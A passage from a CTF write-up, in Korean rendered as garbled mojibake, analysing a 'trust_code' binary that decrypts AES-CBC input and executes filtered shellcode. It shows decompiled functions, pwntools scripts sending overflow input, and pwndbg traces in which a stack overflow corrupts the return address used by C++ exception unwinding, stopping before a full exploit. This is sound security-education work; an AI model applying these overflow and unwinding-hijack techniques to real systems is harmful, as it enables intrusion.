run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>run</code> í•¨ìˆ˜ëŠ” <code>read_code</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>code</code> í¬ì¸í„°ë¥¼ ë°˜í™˜ë°›ìŠµë‹ˆë‹¤. ì´í›„ <code>&amp;code[16]</code> ë¶€í„° 32ë°”ì´íŠ¸ë¥¼ <code>sc.code</code> ë¡œ ë³µì‚¬í•˜ê³  <code>execute</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. <code>sc</code> ëŠ” <code>Shellcode</code> íƒ€ì…ì˜ ê°ì²´ë¡œ, 32ë°”ì´íŠ¸ í¬ê¸°ì˜ ë°°ì—´ì¸ <code>code</code> ë¥¼ ìœ ì¼í•œ í•„ë“œë¡œ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">run</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int128 v0; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="type">char</span> *code; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line">  Shellcode sc; <span class="comment">// [rsp+20h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  code = read_code();</span><br><span class="line">  v0 = *((_OWORD *)code + <span class="number">1</span>);</span><br><span class="line">  *(_OWORD *)&amp;sc.code[<span class="number">16</span>] = *((_OWORD *)code + <span class="number">2</span>);</span><br><span class="line">  *(_OWORD *)sc.code = v0;</span><br><span class="line">  execute((<span class="type">unsigned</span> __int8 *)&amp;sc);</span><br><span class="line">  Shellcode::~Shellcode(&amp;sc);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_code</code> í•¨ìˆ˜ëŠ” 48ë°”ì´íŠ¸ì˜ codeë¥¼ ë°°ì—´ <code>buf</code> ì— ì…ë ¥ë°›ìŠµë‹ˆë‹¤. ì´í›„ <code>buf</code> ë¥¼ ì¸ìë¡œ í•˜ì—¬ <code>decrypt</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  í¬ì¸í„°ë¥¼ ë°˜í™˜ë°›ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">read_code</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+50h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;code&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> decrypt((<span class="type">unsigned</span> __int8 *)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>decrypt</code> í•¨ìˆ˜ëŠ” ì¸ìë¡œ ì£¼ì–´ì§„ ë¬¸ìì—´ì„ <code>key</code> ì™€ <code>iv</code> ë¥¼ ì´ìš©í•´ AES-CBCë¡œ ë³µí˜¸í™”í•©ë‹ˆë‹¤. ì¸ìëŠ” <code>read_code</code> ì—ì„œ ì…ë ¥ë°›ëŠ” codeì´ë¯€ë¡œ, ì• ì´ˆì— codeëŠ” ì•”í˜¸ë¬¸ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³µí˜¸í™”ëœ í‰ë¬¸ì€ <code>out</code> ì— ì €ì¥ë˜ëŠ”ë°, <code>out</code> ì˜ ìƒìœ„ 16ë°”ì´íŠ¸ê°€ <code>&quot;TRUST_CODE_ONLY!&quot;</code> ê°€ ì•„ë‹ˆë©´ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">decrypt</span><span class="params">(<span class="type">char</span> *in)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::exception *exception; <span class="comment">// [rsp+8h] [rbp-120h]</span></span><br><span class="line">  <span class="type">char</span> *out; <span class="comment">// [rsp+18h] [rbp-110h]</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">248</span>]; <span class="comment">// [rsp+28h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+120h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  out = (<span class="type">char</span> *)operator new[](<span class="number">48uLL</span>);</span><br><span class="line">  AES_set_decrypt_key((__int64)&amp;secret_key, <span class="number">128LL</span>, (<span class="type">int</span> *)key);</span><br><span class="line">  AES_cbc_encrypt((__int64)in, (__int64)out, <span class="number">48LL</span>, (__int64)key, (__int64)iv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(out, <span class="string">&quot;TRUST_CODE_ONLY!&quot;</span>, <span class="number">16uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::exception *)__cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">std</span>::exception::exception(exception);</span><br><span class="line">    __cxa_throw(</span><br><span class="line">      exception,</span><br><span class="line">      (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="built_in">std</span>::exception,</span><br><span class="line">      (<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::exception::~exception);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>decrypt</code> ê°€ ë°˜í™˜í•˜ëŠ” <code>out</code> ì€ ê·¸ëŒ€ë¡œ <code>read_code</code> ì˜ ë°˜í™˜ê°’ì´ ë˜ì–´, <code>run</code> í•¨ìˆ˜ì—ì„œ ìƒìœ„ 16ë°”ì´íŠ¸ë¥¼ ì œì™¸í•œ ë‚˜ë¨¸ì§€ê°€ <code>sc.code</code> ë¡œ ë³µì‚¬ë©ë‹ˆë‹¤. ì´í›„ í˜¸ì¶œë˜ëŠ” <code>execute</code> í•¨ìˆ˜ëŠ” rwx ê¶Œí•œì˜ í˜ì´ì§€ë¥¼ í• ë‹¹í•˜ì—¬ <code>sc.code</code> ì˜ ë‚´ìš©ì„ ë³µì‚¬í•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ë•Œ <code>invalid_check</code> í•¨ìˆ˜ì—ì„œ <code>sc.code</code> ë¥¼ í•„í„°ë§í•˜ëŠ”ë°, <code>\x0f</code> ë˜ëŠ” <code>\x05</code> ê°€ ì¡´ì¬í•˜ì§€ ì•Šì„ ë•Œë§Œ ì‹¤í–‰ì„ í—ˆìš©í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">execute</span><span class="params">(<span class="type">unsigned</span> __int8 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*addr)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)invalid_check(a1) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    addr = (<span class="type">void</span> (*)(<span class="type">void</span>))create_rwx(a1);</span><br><span class="line">    addr();</span><br><span class="line">    munmap(addr, <span class="number">0x1000</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;done?&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> || buf[<span class="number">0</span>] == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    loop_cont = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ìƒì˜ ë‚´ìš©ì„ ì •ë¦¬í•˜ë©´ í”„ë¡œê·¸ë¨ì€ ë‹¤ìŒê³¼ ê°™ì´ ë™ì‘í•©ë‹ˆë‹¤.</p><ol><li><code>iv</code> ì™€ AES-CBCë¡œ ì•”í˜¸í™”ëœ codeë¥¼ ì…ë ¥ë°›ì•„ í‰ë¬¸ìœ¼ë¡œ ë³µí˜¸í™”í•©ë‹ˆë‹¤.</li><li>í‰ë¬¸ì˜ ìƒìœ„ 16ë°”ì´íŠ¸ê°€ <code>&quot;TRUST_CODE_ONLY!&quot;</code> ê°€ ì•„ë‹Œ ê²½ìš° ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.</li><li>í‰ë¬¸ì— <code>\x0f</code> ë˜ëŠ” <code>\x05</code> ê°€ ì¡´ì¬í•˜ì§€ ì•Šì€ ê²½ìš°ì—ë§Œ rwx í˜ì´ì§€ë¡œ ë³µì‚¬í•˜ì—¬ ì‹¤í–‰í•©ë‹ˆë‹¤.</li></ol><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>ì…¸ì„ íšë“í•˜ê¸° ìœ„í•´ì„œëŠ” ìƒìœ„ 16ë°”ì´íŠ¸ë¥¼ <code>&quot;TRUST_CODE_ONLY!&quot;</code>, ë‚˜ë¨¸ì§€ë¥¼ ì…¸ì½”ë“œë¡œ ì±„ìš´ ë¬¸ìì—´ì„ AES-CBCë¡œ ì•”í˜¸í™”í•˜ì—¬ codeë¡œ ì…ë ¥í•´ì•¼ í•©ë‹ˆë‹¤. í”„ë¡œê·¸ë¨ì—ì„œ ë³µí˜¸í™” ê³¼ì •ì— íŠ¹ë³„í•œ ì·¨ì•½ì ì´ ì—†ê³  <code>iv</code> ëŠ” ì§ì ‘ ì…ë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì„œë²„ì—ì„œ ì‚¬ìš©í•˜ëŠ” <code>key</code> ê°’ì„ ìœ ì¶œí•˜ì—¬ ì˜¬ë°”ë¥¸ ì•”í˜¸ë¬¸ì„ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤.</p><p>ê·¸ëŸ°ë° í”„ë¡œê·¸ë¨ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ <code>iv</code> ì— 16ê°œì˜ a, <code>code</code> ì— 48ê°œì˜ aë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ëª…ì‹œì ìœ¼ë¡œ í˜¸ì¶œí•˜ì§€ë„ ì•Šì€ ì¶œë ¥ ë£¨í‹´ì´ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./trust_code&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./test.py</span><br><span class="line">[+] Starting local process &#x27;./trust_code&#x27;: pid 2560632</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Process &#x27;./trust_code&#x27; stopped with exit code 0 (pid 2560632)</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p>ì¶œë ¥ ë£¨í‹´ì˜ ì •ì²´ëŠ” <code>run</code> í•¨ìˆ˜ì— ì¡´ì¬í•˜ëŠ” ëœë”© íŒ¨ë“œì…ë‹ˆë‹¤. <code>run</code> í•¨ìˆ˜ì—ì„œ <code>Shellcode</code> ê°ì²´ë¥¼ ì„ ì–¸í•˜ëŠ”ë°, ì˜ˆì™¸ê°€ ë°œìƒí•˜ë©´ ìŠ¤íƒ ë˜ê°ê¸° ê³¼ì •ì—ì„œ ì´ ê°ì²´ë¥¼ ì†Œë©¸ì‹œì¼œì•¼ í•˜ë¯€ë¡œ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ëŠ” ëœë”© íŒ¨ë“œë¥¼ ë¨¼ì € ë°©ë¬¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. <code>run</code> í•¨ìˆ˜ì˜ ê·¸ë˜í”„ë¥¼ ì‚´í´ë³´ë©´ ê·¸ë¦¼ì—ì„œ ìƒ‰ì¹ í•œ ë¶€ë¶„ê³¼ ê°™ì´ ë‹¤ë¥¸ ë£¨í‹´ê³¼ ë™ë–¨ì–´ì§„ ë¸”ë¡ì´ í•˜ë‚˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¸”ë¡ì´ ë°”ë¡œ ëœë”© íŒ¨ë“œì…ë‹ˆë‹¤.</p><p><img src="/images/line22-trust-code/1.png" alt="1.png"></p><p>ì´ë²ˆì—ëŠ” ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼í‚¤ê¸° ìœ„í•´ codeì— 16ê°œì˜ aì™€ 8ê°œì˜ b, 8ê°œì˜ cë¥¼ ì…ë ¥í•˜ì˜€ìŠµë‹ˆë‹¤. ì‹¤í–‰í•˜ë©´ ì„¸ê·¸ë©˜í…Œì´ì…˜ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©° ì¢…ë£Œí•˜ëŠ”ë°, &quot;stack smashing detected&quot;ì™€ ê°™ì€ ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ ì¶œë ¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŠ” Canary ë³´í˜¸ ê¸°ë²•ì— ì˜í•œ ê²ƒì´ ì•„ë‹ˆë¼ ë‹¤ë¥¸ ë£¨í‹´ì—ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì—¬ ì¢…ë£Œí•˜ì˜€ìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;c&quot;</span> * <span class="number">8</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./test.py</span><br><span class="line">[+] Starting local process &#x27;./trust_code&#x27;: pid 2562716</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Got EOF while reading in interactive</span><br><span class="line">$</span><br><span class="line">[*] Process &#x27;./trust_code&#x27; stopped with exit code -11 (SIGSEGV) (pid 2562716)</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure><p>GDBë¥¼ ë¶™ì—¬ ì‹¤í–‰í•˜ë©´ ì˜¤ë¥˜ê°€ ë°œìƒí•œ ì›ì¸ì€ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ì—ì„œ í˜¸ì¶œí•œ ë£¨í‹´ì´ ì£¼ì†Œ <code>0x6363636363636363</code> ì— ì ‘ê·¼ì„ ì‹œë„í•˜ì˜€ê¸° ë•Œë¬¸ì„ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì£¼ì†ŒëŠ” ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì¼ìœ¼í‚¤ê¸° ìœ„í•´ ì…ë ¥í•œ 8ê°œì˜ cì— í•´ë‹¹í•©ë‹ˆë‹¤. ë˜í•œ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”í•˜ë©´ í˜¸ì¶œí•œ ë£¨í‹´ì€ <code>uw_frame_state_for</code> ë‚´ì¥ í•¨ìˆ˜ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ìì„¸í•œ ì„¤ëª…ì€ ë§ë¨¸ë¦¬ì—ì„œ ë§í¬í•œ ê¸€ì˜ â€˜ë™ì  ë¶„ì„â€™ ë¬¸ë‹¨ì„ ì°¸ê³ í•˜ê¸° ë°”ëë‹ˆë‹¤)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">Python Exception &lt;class &#x27;AttributeError&#x27;&gt;: &#x27;NoneType&#x27; object has no attribute &#x27;startswith&#x27;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7ff413636c50    cmp    byte ptr [rax], 0x48</span><br><span class="line">   0x7ff413636c53    jne    0x7ff413636bb0                &lt;0x7ff413636bb0&gt;</span><br><span class="line"></span><br><span class="line">   0x7ff413636c59    movabs rdx, 0x50f0000000fc0c7</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x6363636363636363  7161677110969590627</span><br><span class="line">pwndbg&gt; k</span><br><span class="line">#0  0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">#1  0x00007ff41363808b in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">#2  0x00007ff41383b69c in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6</span><br><span class="line">#3  0x000055ffe2bb5333 in decrypt(unsigned char*) ()</span><br><span class="line">#4  0x000055ffe2bb53d6 in read_code() ()</span><br><span class="line">#5  0x000055ffe2bb5627 in run() ()</span><br><span class="line">#6  0x000055ffe2bb56d0 in loop() ()</span><br><span class="line">#7  0x000055ffe2bb5748 in service() ()</span><br><span class="line">#8  0x6363636363636363 in ?? ()</span><br><span class="line">#9  0x0000000000000000 in ?? ()</span><br><span class="line">pwndbg&gt; disass _Unwind_RaiseException</span><br><span class="line">Dump of assembler code for function _Unwind_RaiseException:</span><br><span class="line">...</span><br><span class="line">   0x00007ff413638080 &lt;+304&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ff413638083 &lt;+307&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ff413638086 &lt;+310&gt;:   call   0x7ff413636800</span><br><span class="line">   0x00007ff41363808b &lt;+315&gt;:   cmp    eax,0x5</span><br><span class="line">   0x00007ff41363808e &lt;+318&gt;:   je     0x7ff413638103 &lt;_Unwind_RaiseException+435&gt;</span><br></pre></td></tr></table></figure><p><code>uw_frame_state_for</code> ë‚´ì¥ í•¨ìˆ˜ëŠ” ì¸ìë¡œ ì „ë‹¬ëœ <code>context</code> êµ¬ì¡°ì²´ê°€ ë‚˜íƒ€ë‚´ëŠ” í”„ë ˆì„ì˜ CIEì™€ FDEë¥¼ ì°¾ì•„ í•´ì„í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. ì´ í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ í˜ì´ë¡œë“œë¡œ ì…ë ¥í•œ ì£¼ì†Œì— ì ‘ê·¼í•˜ëŠ” ê²ƒì€ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ ì¸í•´ ë¨¼ì € ìŠ¤íƒì´ ì˜¤ì—¼ë˜ê³ , ì˜¤ì—¼ëœ ë‚´ìš©ì„ ìŠ¤íƒ ë˜ê°ê¸° ê³¼ì •ì—ì„œ ì°¸ì¡°í•˜ë©´ì„œ <code>context</code> êµ¬ì¡°ì²´ê°€ ì˜¤ì—¼ë˜ì—ˆê¸° ë•Œë¬¸ì„ì„ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ <code>uw_frame_state_for</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” <code>_Unwind_RaiseException+310</code> ì£¼ì†Œì— ì¤‘ë‹¨ì ì„ ì„¤ì •í•˜ê³  GDBë¥¼ ë¶™ì—¬ ì‹¤í–‰í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set $context=$rdi</span><br><span class="line">pwndbg&gt; continue</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffd76e021f0: 0x00007ffd76e02468      0x00007ffd76e02470</span><br><span class="line">0x7ffd76e02200: 0x0000000000000000      0x00007ffd76e02478</span><br><span class="line">0x7ffd76e02210: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02220: 0x00007ffd76e024b0      0x0000000000000000</span><br><span class="line">0x7ffd76e02230: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02240: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffd76e02250: 0x00007ffd76e024b8      0x00007ffd76e024c0</span><br><span class="line">0x7ffd76e02260: 0x00007ffd76e02490      0x00007ffd76e02498</span><br><span class="line">0x7ffd76e02270: 0x00007ffd76e026b8      0x0000000000000000</span><br><span class="line">0x7ffd76e02280: 0x00007ffd76e026c0      0x000055d6cf1f7748</span><br><span class="line">pwndbg&gt; continue</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7fff5b23be70: 0x00007fff5b23c0e8      0x00007fff5b23c0f0</span><br><span class="line">0x7fff5b23be80: 0x0000000000000000      0x00007fff5b23c0f8</span><br><span class="line">0x7fff5b23be90: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bea0: 0x00007fff5b23c130      0x0000000000000000</span><br><span class="line">0x7fff5b23beb0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bec0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fff5b23bed0: 0x00007fff5b23c138      0x00007fff5b23c140</span><br><span class="line">0x7fff5b23bee0: 0x00007fff5b23c110      0x00007fff5b23c118</span><br><span class="line">0x7fff5b23bef0: 0x00007fff5b23c368      0x0000000000000000</span><br><span class="line">0x7fff5b23bf00: 0x00007fff5b23c370      0x6363636363636363</span><br></pre></td></tr></table></figure><p>ê³„ì† ì‹¤í–‰í•˜ë‹¤ ë³´ë©´ <code>context-&gt;ra</code> í•„ë“œì˜ ê°’ì´ <code>0x000055d6cf1f7748</code> ì—ì„œ <code>0x6363636363636363</code> ìœ¼ë¡œ ë°”ë€ŒëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì „ìëŠ” ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•˜ëŠ” <code>service</code> ë£¨í‹´ì˜ ë‚´ë¶€ì´ê³ , í›„ìëŠ” ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ ì¸í•´ ë³€ì¡°ëœ ë¦¬í„´ ì£¼ì†Œì…ë‹ˆë‹¤.</p><p><code>context-&gt;ra</code> í•„ë“œëŠ” ìŠ¤íƒ ë˜ê°ê¸° ê³¼ì •ì—ì„œ personality ë£¨í‹´ì´ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ êµ¬í•˜ê¸° ìœ„í•´ ì°¸ì¡°í•˜ëŠ” ê°’ì…ë‹ˆë‹¤. 